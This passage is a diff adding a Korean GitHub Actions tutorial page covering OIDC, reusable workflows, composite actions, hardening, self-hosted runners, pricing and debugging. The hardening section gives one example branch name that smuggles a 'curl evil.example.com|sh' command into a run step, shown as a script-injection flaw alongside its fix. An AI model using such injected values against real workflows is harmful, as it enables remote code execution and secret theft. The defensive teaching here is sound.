+<p>하나라도 지정하면 <b>지정하지 않은 권한은 모두 <code>none</code></b>이 됩니다. 주요 스코프: <code>contents</code>, <code>issues</code>, <code>pull-requests</code>, <code>actions</code>, <code>checks</code>, <code>statuses</code>, <code>deployments</code>, <code>pages</code>, <code>packages</code>, <code>id-token</code>, <code>security-events</code>, <code>attestations</code>.</p>
+
+<h3>OIDC: 클라우드에 장기 키 없이 로그인</h3>
+<p>AWS 액세스 키를 secret에 넣어 두면 유출 시 만료될 때까지 계속 쓰일 수 있습니다. OIDC를 쓰면 Job이 GitHub에 서명된 <b>짧은 수명의 ID 토큰</b>을 요청하고, 클라우드는 토큰의 <code>sub</code> 클레임(예: <code>repo:you/excel-dashboard:environment:production</code>)을 확인해 임시 자격 증명을 내줍니다.</p>
+<pre data-lang="yaml">permissions:
+  id-token: write      # OIDC 토큰 발급
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-dashboard-deploy
+          aws-region: ap-northeast-2
+      - run: aws s3 sync ./site s3://example-dashboard-bucket --delete</pre>
+<div class="callout callout-warn">
+  <span class="callout-title">클라우드 쪽 신뢰 조건을 좁게</span>
+  IAM 역할의 신뢰 정책에서 <code>sub</code>를 <code>repo:you/*</code>처럼 넓게 열면, 같은 계정의 아무 저장소·아무 브랜치(fork PR 포함 가능)가 역할을 가져갈 수 있습니다. <b>저장소 + environment(또는 브랜치)</b>까지 고정하세요. Azure(<code>azure/login</code>), GCP(<code>google-github-actions/auth</code>)도 같은 원리입니다.
+</div>
+
+<h2>7. 재사용: Reusable workflow vs Action</h2>
+<table>
+  <thead><tr><th></th><th>Reusable workflow</th><th>Composite action</th><th>JavaScript action</th><th>Docker action</th></tr></thead>
+  <tbody>
+    <tr><td>단위</td><td>Job 여러 개 (runner 선택 포함)</td><td>Step 묶음</td><td>Node 프로그램</td><td>컨테이너</td></tr>
+    <tr><td>호출</td><td>Job 수준 <code>uses:</code></td><td>Step 수준 <code>uses:</code></td><td>Step 수준</td><td>Step 수준</td></tr>
+    <tr><td>Secret</td><td><code>secrets:</code>로 전달 또는 <code>inherit</code></td><td>입력으로 받음</td><td>입력으로</td><td>입력으로</td></tr>
+    <tr><td>OS</td><td>호출된 쪽이 정함</td><td>모든 OS</td><td>모든 OS, 가장 빠름</td><td>Linux만, 이미지 빌드 시간</td></tr>
+    <tr><td>어울리는 곳</td><td>조직 표준 CI/배포 파이프라인</td><td>"설치+설정+실행" 반복 묶기</td><td>API 호출, 복잡한 로직</td><td>특정 도구 체인 고정</td></tr>
+  </tbody>
+</table>
+
+<h3>Reusable workflow 만들기·호출하기</h3>
+<pre data-lang="yaml"># .github/workflows/convert-reusable.yml (호출되는 쪽)
+on:
+  workflow_call:
+    inputs:
+      engine:
+        type: string
+        default: openpyxl
+    secrets:
+      NOTIFY_TOKEN:
+        required: false
+    outputs:
+      rows:
+        value: ${{ jobs.convert.outputs.rows }}
+
+jobs:
+  convert:
+    runs-on: ubuntu-latest
+    outputs:
+      rows: ${{ steps.run.outputs.rows }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: run
+        env:
+          ENGINE: ${{ inputs.engine }}
+        run: echo "rows=42" &gt;&gt; "$GITHUB_OUTPUT"</pre>
+<pre data-lang="yaml"># 호출하는 쪽
+jobs:
+  call:
+    uses: you/shared-workflows/.github/workflows/convert-reusable.yml@v1
+    with:
+      engine: openpyxl
+    secrets:
+      NOTIFY_TOKEN: ${{ secrets.NOTIFY_TOKEN }}   # 꼭 필요한 것만 (inherit 남용 금지)</pre>
+<p>작성 시점 기준으로 최대 10단계 중첩, 한 실행에서 고유 재사용 워크플로우 50개까지 호출할 수 있습니다(<a href="https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations" target="_blank" rel="noopener">한도 문서</a>).</p>
+
+<h3>간단한 Composite action 만들기</h3>
+<pre data-lang="yaml"># .github/actions/setup-converter/action.yml
+name: Setup converter
+description: Python + 의존성 설치를 한 번에
+inputs:
+  python-version:
+    description: 사용할 Python 버전
+    default: "3.12"
+  requirements:
+    description: requirements 파일 경로 (호출 저장소 기준)
+    default: scripts/requirements.txt
+outputs:
+  python-path:
+    description: 설치된 python 경로
+    value: ${{ steps.py.outputs.python-path }}
+runs:
+  using: composite
+  steps:
+    - id: py
+      uses: actions/setup-python@v5
+      with:
+        python-version: ${{ inputs.python-version }}
+        cache: pip
+    - shell: bash                     # composite의 run step은 shell 필수
+      env:
+        REQ: ${{ inputs.requirements }}   # 입력도 env로 넘기는 습관
+      run: pip install -r "$REQ"</pre>
+<pre data-lang="yaml"># 사용하는 쪽 (같은 저장소라면 checkout 후 로컬 경로로)
+steps:
+  - uses: actions/checkout@v4
+  - uses: ./.github/actions/setup-converter
+    with:
+      python-version: "3.13"</pre>
+<p>다른 저장소에 공개하려면 저장소 루트에 <code>action.yml</code>을 두고 태그(<code>v1</code>)를 붙이면 <code>uses: you/setup-converter@v1</code>로 쓸 수 있습니다. Marketplace 게시는 선택입니다.</p>
+
+<h2>8. 보안 강화(Hardening)</h2>
+<p>워크플로우는 <b>저장소 쓰기 권한과 secret을 가진 원격 실행 환경</b>입니다. 공격자 입장에서는 매력적인 표적이에요.</p>
+
+<h3>① 스크립트 인젝션</h3>
+<p><code>${{ }}</code>는 셸 실행 전에 문자열로 치환되므로, 이슈 제목·PR 제목·브랜치 이름·커밋 메시지 같은 <b>사용자가 정할 수 있는 값</b>을 <code>run:</code>에 직접 넣으면 명령 주입이 됩니다.</p>
+<pre data-lang="yaml"># ❌ 브랜치 이름이 a";curl${IFS}evil.example.com|sh;# 라면?
+- run: echo "Branch: ${{ github.head_ref }}"
+
+# ✅ 환경 변수로 넘기면 셸은 "값"으로만 취급
+- env:
+    HEAD_REF: ${{ github.head_ref }}
+  run: echo "Branch: $HEAD_REF"</pre>
+<p>위험한 필드 예: <code>github.event.issue.title/body</code>, <code>github.event.pull_request.title/body/head.ref</code>, <code>github.event.comment.body</code>, <code>github.event.commits.*.message</code>, <code>github.head_ref</code>. <code>actions/github-script</code>의 <code>script:</code> 안에서도 같은 문제가 생깁니다(JavaScript 인젝션).</p>
+
+<h3>② pull_request vs pull_request_target</h3>
+<table>
+  <thead><tr><th></th><th><code>pull_request</code></th><th><code>pull_request_target</code></th></tr></thead>
+  <tbody>
+    <tr><td>실행되는 코드</td><td>PR의 merge 커밋 (PR 작성자의 코드)</td><td><b>base 브랜치</b>의 워크플로우 정의</td></tr>
+    <tr><td>fork PR의 권한</td><td>읽기 전용 토큰, secret 없음</td><td><b>쓰기 토큰 + secret 있음</b></td></tr>
+    <tr><td>용도</td><td>빌드·테스트 (기본 선택)</td><td>라벨 달기·댓글 등 PR 코드를 실행하지 않는 작업</td></tr>
+  </tbody>
+</table>
+<div class="callout callout-danger">
+  <span class="callout-title">"pwn request" 패턴</span>
+  <code>pull_request_target</code>(또는 <code>workflow_run</code>)에서 <code>actions/checkout</code>으로 <b>PR head 코드를 받아 빌드·테스트·스크립트 실행</b>을 하면, 공격자가 PR에 넣은 코드가 secret과 쓰기 토큰을 가진 채 실행됩니다. 실제 오픈소스 공급망 사고의 단골 원인입니다. 꼭 필요하면 PR 코드 실행 Job(권한 없음)과 결과를 게시하는 Job(권한 있음, 코드 실행 없음)을 분리하고, artifact 내용도 신뢰하지 마세요.
+</div>
+
+<h3>③ 서드파티 Action 고정</h3>
+<pre data-lang="yaml"># 태그는 저장소 주인이 언제든 다른 커밋으로 옮길 수 있음
+- uses: actions/checkout@v4
+# ✅ 전체 커밋 SHA로 고정 + 사람이 읽을 수 있게 주석으로 버전 표기
+- uses: actions/checkout@&lt;40자리-커밋-SHA&gt; # v4.x.x</pre>
+<p>이 사이트의 예제는 읽기 쉽게 버전 태그를 썼지만, 실무에서는 <b>특히 서드파티 Action을 SHA로 고정</b>하는 것이 권장됩니다. 실제로 인기 Action의 태그가 악성 커밋으로 바뀌어 secret이 로그로 새어 나간 사고가 있었습니다. 조직·저장소 설정에서 "SHA 고정 필수"와 허용 Action 목록을 강제할 수도 있어요.</p>
+<p>SHA 고정 후 업데이트는 Dependabot이 맡게 합니다.</p>
+<pre data-lang="yaml"># .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    schedule:
+      interval: weekly
+    groups:
+      actions:
+        patterns: ["*"]</pre>
+
+<h3>④ 보안 체크리스트</h3>
+<ul class="checklist" data-checklist="expert-actions-hardening">
+  <li>워크플로우 최상단 <code>permissions:</code>를 최소로, Job별로 필요한 쓰기 권한만 추가</li>
+  <li>신뢰할 수 없는 입력은 <code>env:</code>로 전달, <code>run:</code>·<code>script:</code>에 <code>${{ }}</code>로 직접 넣지 않기</li>
+  <li><code>pull_request_target</code>·<code>workflow_run</code>에서 PR 코드 실행 금지</li>
+  <li>서드파티 Action은 SHA 고정 + Dependabot, 허용 목록 정책</li>
+  <li><code>actions/checkout</code>에 <code>persist-credentials: false</code> (이후 step이 git push할 필요가 없다면)</li>
+  <li>장기 클라우드 키 대신 OIDC, 배포 secret은 environment에</li>
+  <li>공개 저장소에서 누가 워크플로우를 깨울 수 있는지(<code>author_association</code>, fork PR 승인 설정) 확인</li>
+  <li><code>CODEOWNERS</code>로 <code>.github/workflows/</code> 변경에 리뷰 필수</li>
+  <li>정적 분석 도구(<code>zizmor</code>, <code>actionlint</code>)와 CodeQL의 Actions 분석으로 워크플로우 점검</li>
+</ul>
+
+<div class="quiz" data-answer="b">
+  <p class="quiz-q">fork PR의 테스트 결과에 댓글을 달려고 <code>pull_request_target</code>으로 바꾸고, PR 코드를 checkout해서 <code>npm test</code>를 실행했습니다. 가장 큰 문제는?</p>
+  <div class="quiz-options">
+    <button type="button" data-opt="a">fork PR에서는 워크플로우가 실행되지 않는다</button>
+    <button type="button" data-opt="b">PR 작성자의 코드(package.json 스크립트 등)가 secret과 쓰기 토큰을 가진 채 실행된다</button>
+    <button type="button" data-opt="c">테스트가 base 브랜치 코드로 실행되어 결과가 틀린다</button>
+  </div>
+  <p class="quiz-explain">정답! <code>npm test</code>는 PR이 수정할 수 있는 <code>package.json</code>의 스크립트를 실행합니다. <code>pull_request</code>로 테스트하고, 결과는 artifact로 남긴 뒤 별도 Job(코드 실행 없음)에서 댓글을 다는 구조가 안전합니다.</p>
+</div>
+
+<h2>9. Self-hosted runner</h2>
+<h3>언제 쓰나</h3>
+<ul>
+  <li>특수 소프트웨어·라이선스가 필요할 때 (PART 2의 <b>Excel이 설치된 Windows</b>가 대표 예)</li>
+  <li>사내망 자원(DB, 사설 레지스트리)에 접근해야 할 때</li>
+  <li>GPU·대용량 메모리 등 hosted runner로는 비싸거나 없는 하드웨어</li>
+  <li>대량 실행 시 비용 최적화 (단, 운영 인력 비용을 함께 계산)</li>
+</ul>
+
+<h3>위험과 대응</h3>
+<div class="callout callout-danger">
+  <span class="callout-title">공개 저장소 + self-hosted runner = 위험</span>
+  공개 저장소에서는 누구나 PR을 열 수 있고, 그 PR의 코드가 여러분의 머신에서 실행될 수 있습니다. 비영구(persistent) runner라면 악성 코드가 다음 Job을 기다리며 상주하거나, 내부망으로 이동할 수 있어요. <b>공개 저장소에는 self-hosted runner를 붙이지 않는 것</b>이 기본 원칙입니다.
+</div>
+<table>
+  <thead><tr><th>대응</th><th>설명</th></tr></thead>
+  <tbody>
+    <tr><td>Ephemeral runner</td><td><code>./config.sh --ephemeral</code>: Job 하나만 실행하고 등록 해제. VM/컨테이너를 매번 새로 만들어 hosted runner처럼 "깨끗한 상태" 보장</td></tr>
+    <tr><td>Runner group</td><td>조직 수준에서 어떤 저장소·워크플로우가 이 runner를 쓸 수 있는지 제한</td></tr>
+    <tr><td>네트워크 격리</td><td>runner가 접근할 수 있는 내부 자원을 최소화, 아웃바운드 제한</td></tr>
+    <tr><td>Actions Runner Controller (ARC)</td><td>Kubernetes에서 runner scale set을 자동 확장·축소. 대기 Job 수에 맞춰 ephemeral 파드 생성</td></tr>
+    <tr><td>최소 권한 계정</td><td>runner 서비스를 관리자 계정으로 돌리지 않기, 머신 자격 증명 공유 금지</td></tr>
+  </tbody>
+</table>
+<pre data-lang="yaml"># self-hosted runner 선택: label을 모두 만족하는 runner에 배정
+jobs:
+  excel:
+    runs-on: [self-hosted, windows, excel]</pre>
+<p>label 이름은 단지 이름일 뿐 물리 위치나 권한을 보장하지 않습니다. 어떤 runner가 어느 저장소에 등록되어 있는지 정기적으로 점검하세요.</p>
+
+<h2>10. 요금과 한도</h2>
+<p>요금 체계는 자주 바뀝니다. 아래는 <b>작성 시점 기준</b>이며, 반드시 <a href="https://docs.github.com/en/billing/concepts/product-billing/github-actions" target="_blank" rel="noopener">요금 문서</a>와 <a href="https://docs.github.com/en/actions/reference/limits" target="_blank" rel="noopener">한도 문서</a>를 확인하세요.</p>
+<h3>과금 기본</h3>
+<ul>
+  <li><b>Public 저장소의 표준 GitHub-hosted runner는 무료</b>입니다. (larger runner는 public에서도 과금)</li>
+  <li>Private 저장소는 플랜에 포함된 월 사용량을 쓰고, 넘으면 분 단위로 과금됩니다. 현재 공식 문서는 포함량을 "분"이 아니라 <b>금액</b>으로 표시합니다(예: Free $12, Pro·Team $18, Enterprise Cloud $300 상당).</li>
+  <li>Self-hosted runner 사용 시간은 현재 문서상 무료입니다(하드웨어·운영 비용은 본인 부담).</li>
+</ul>
+<table>
+  <thead><tr><th>Runner (private 저장소)</th><th>분당 단가 (USD, 작성 시점)</th><th>Linux 2-core 대비</th></tr></thead>
+  <tbody>
+    <tr><td>Linux 1-core (<code>ubuntu-slim</code>)</td><td>$0.002</td><td>약 0.33배</td></tr>
+    <tr><td>Linux 2-core x64</td><td>$0.006</td><td>1배</td></tr>
+    <tr><td>Linux 2-core arm64</td><td>$0.005</td><td>약 0.83배</td></tr>
+    <tr><td>Windows 2-core</td><td>$0.010</td><td>약 1.7배</td></tr>
+    <tr><td>macOS 3·4-core</td><td>$0.062</td><td>약 10배</td></tr>
+  </tbody>
+</table>
+<p>예전 문서는 "Linux 1배 · Windows 2배 · macOS 10배" 같은 <b>분 배수</b>로 설명했고, 지금은 runner 종류별 단가로 안내합니다. 어느 쪽이든 결론은 같아요: <b>Windows·macOS는 꼭 필요한 Job에만</b>.</p>
+
+<h3>주요 한도</h3>
+<table>
+  <thead><tr><th>항목</th><th>한도 (작성 시점)</th></tr></thead>
+  <tbody>
+    <tr><td>Job 실행 시간</td><td>GitHub-hosted 6시간 / self-hosted 5일</td></tr>
+    <tr><td>워크플로우 실행 전체</td><td>35일 (승인 대기 포함)</td></tr>
+    <tr><td>Matrix</td><td>실행당 256개 Job</td></tr>
+    <tr><td>동시 Job (표준 runner)</td><td>Free 20 · Pro 40 · Team 60 · Enterprise 500 (macOS는 Free~Team 5, Enterprise 50)</td></tr>
+    <tr><td>캐시</td><td>저장소당 10 GB</td></tr>
+    <tr><td>Artifact 저장 용량</td><td>Free 500 MB · Pro 1 GB · Team 2 GB · Enterprise Cloud 50 GB</td></tr>
+    <tr><td><code>GITHUB_TOKEN</code> API 호출</td><td>저장소당 시간당 1,000회 (Enterprise Cloud 15,000)</td></tr>
+    <tr><td>재실행</td><td>실행당 50회</td></tr>
+  </tbody>
+</table>
+
+<h2>11. 디버깅</h2>
+<h3>로그 상세도 올리기</h3>
+<ul>
+  <li><b>Re-run jobs → "Enable debug logging"</b> 체크: 그 재실행에만 디버그 로그 활성화.</li>
+  <li>항상 켜려면 저장소 secret 또는 variable로 <code>ACTIONS_STEP_DEBUG=true</code>(step 상세), <code>ACTIONS_RUNNER_DEBUG=true</code>(runner 진단 로그)를 설정.</li>
+  <li>context 전체 덤프: <code>env: { CTX: "${{ toJSON(github.event) }}" }</code> 후 <code>echo "$CTX"</code>. 공개 로그에 민감한 값이 없는지 확인하세요.</li>
+</ul>
+<h3>gh CLI로 터미널에서</h3>
+<pre data-lang="bash">gh run list --workflow excel-to-dashboard.yml --limit 5
+gh run watch                          # 진행 중인 실행 실시간 보기
+gh run view &lt;run-id&gt; --log-failed     # 실패한 step 로그만
+gh run rerun &lt;run-id&gt; --failed --debug  # 실패 Job만 디버그 모드로 재실행
+gh run download &lt;run-id&gt; -n data-json # artifact 받기
+gh cache list                         # 캐시 목록 (gh cache delete 로 정리)</pre>
+<h3>로컬에서 미리 돌려 보기: act</h3>
+<p><a href="https://github.com/nektos/act" target="_blank" rel="noopener">nektos/act</a>는 Docker 컨테이너로 워크플로우를 흉내 내 실행합니다. YAML 문법·간단한 스크립트 검증에는 유용하지만, <b>Windows·macOS runner, OIDC, GitHub 캐시·일부 context는 재현되지 않습니다</b>. PART 2의 <code>windows-latest</code> Job은 act로 확인하기 어려워요.</p>
+<pre data-lang="bash">act -l                                # 실행될 Job 목록
+act issues -e event.json -j convert   # 가짜 이벤트 payload로 특정 Job 실행
+actionlint                            # 워크플로우 정적 검사 (문법·표현식·셸)</pre>
+
+<h3>자주 만나는 증상</h3>
+<table>
+  <thead><tr><th>증상</th><th>원인과 해결</th></tr></thead>
+  <tbody>
+    <tr><td>Job이 계속 "Queued"</td><td>동시 실행 한도 초과, <code>runs-on</code> label에 맞는 runner 없음(오타·self-hosted 오프라인), concurrency 그룹 대기</td></tr>
+    <tr><td><code>Resource not accessible by integration</code> (403)</td><td><code>permissions:</code>에 필요한 스코프 누락, fork PR의 읽기 전용 토큰</td></tr>
+    <tr><td>워크플로우가 아예 안 뜸</td><td>YAML 오류(Actions 탭 경고 확인), 이벤트가 기본 브랜치에 없는 워크플로우 정의를 참조(<code>issues</code>·<code>schedule</code> 등은 기본 브랜치 기준), <code>paths</code> 필터, <code>GITHUB_TOKEN</code>이 만든 이벤트</td></tr>
+    <tr><td>Windows에서만 실패</td><td>기본 셸이 <code>pwsh</code>(<code>$VAR</code> 대신 <code>$env:VAR</code>), CRLF, 경로 구분자</td></tr>
+    <tr><td>output이 비어 있음</td><td>step에 <code>id</code> 없음, Job <code>outputs:</code>에 매핑 누락, secret으로 판단되어 마스킹된 값은 Job 간 전달 안 됨</td></tr>
+  </tbody>
+</table>
+
+<h2>12. 성능 최적화</h2>
+<table>
+  <thead><tr><th>기법</th><th>효과</th><th>PART 2 적용 예</th></tr></thead>
+  <tbody>
+    <tr><td>Linux 우선</td><td>준비 시간·단가 모두 유리</td><td>엑셀 앱이 필요 없다면 <code>ubuntu-latest</code> + openpyxl</td></tr>
+    <tr><td>Matrix 병렬</td><td>파일·버전별 Job을 동시에</td><td>지역별 엑셀 여러 개를 동시 변환 후 한 Job에서 합쳐 배포</td></tr>
+    <tr><td>캐시</td><td>의존성 설치 시간 단축</td><td><code>cache: pip</code> + <code>cache-dependency-path</code></td></tr>
+    <tr><td>Path 필터</td><td>관계없는 변경에 실행 안 함</td><td><code>deploy-dashboard.yml</code>의 <code>paths: ["dashboard/**"]</code></td></tr>
+    <tr><td>얕은 checkout</td><td>기본 <code>fetch-depth: 1</code> 유지, 전체 이력은 필요할 때만</td><td>docs 브랜치 작업에만 추가 fetch</td></tr>
+    <tr><td>concurrency 취소</td><td>쓸모없어진 PR 실행 즉시 중단</td><td>PR 테스트 워크플로우에 <code>cancel-in-progress: true</code></td></tr>
+    <tr><td>Job 분할·조기 실패</td><td>빠른 lint를 먼저, 무거운 Job은 <code>needs</code>로 뒤에</td><td>lint 실패 시 Windows Job 자체를 띄우지 않음</td></tr>
+    <tr><td>사전 빌드 이미지</td><td>매번 설치하는 도구를 컨테이너 이미지에 포함</td><td><code>container: ghcr.io/you/converter:1.0</code> (Linux)</td></tr>
+  </tbody>
+</table>
+
+<div class="quiz" data-answer="a">
+  <p class="quiz-q">private 저장소에서 엑셀 10개를 변환합니다. 비용과 시간을 모두 줄이는 가장 좋은 첫 수는?</p>
+  <div class="quiz-options">
+    <button type="button" data-opt="a">Linux runner + openpyxl로 바꾸고 matrix로 병렬 실행, pip 캐시 사용</button>
+    <button type="button" data-opt="b">windows-latest 하나에서 10개를 순서대로 처리</button>
+    <button type="button" data-opt="c">macos-latest가 가장 빠르므로 macOS로 변경</button>
+  </div>
+  <p class="quiz-explain">정답! Linux는 단가가 가장 낮고 준비가 빠르며, matrix로 10개를 동시에 처리하면 전체 시간이 가장 긴 파일 하나 수준으로 줄어듭니다. macOS는 단가가 약 10배입니다.</p>
+</div>
+
+<h2>13. 더 읽을거리</h2>
+<ul>
+  <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax" target="_blank" rel="noopener">Workflow syntax 레퍼런스</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows" target="_blank" rel="noopener">워크플로우를 트리거하는 이벤트</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/security/secure-use" target="_blank" rel="noopener">Secure use reference (보안 강화 가이드)</a></li>
+  <li><a href="https://docs.github.com/en/actions/concepts/security/openid-connect" target="_blank" rel="noopener">OpenID Connect 개념</a></li>
+  <li><a href="https://docs.github.com/en/actions/reference/limits" target="_blank" rel="noopener">Actions 한도</a> · <a href="https://docs.github.com/en/billing/concepts/product-billing/github-actions" target="_blank" rel="noopener">Actions 요금</a></li>
+</ul>
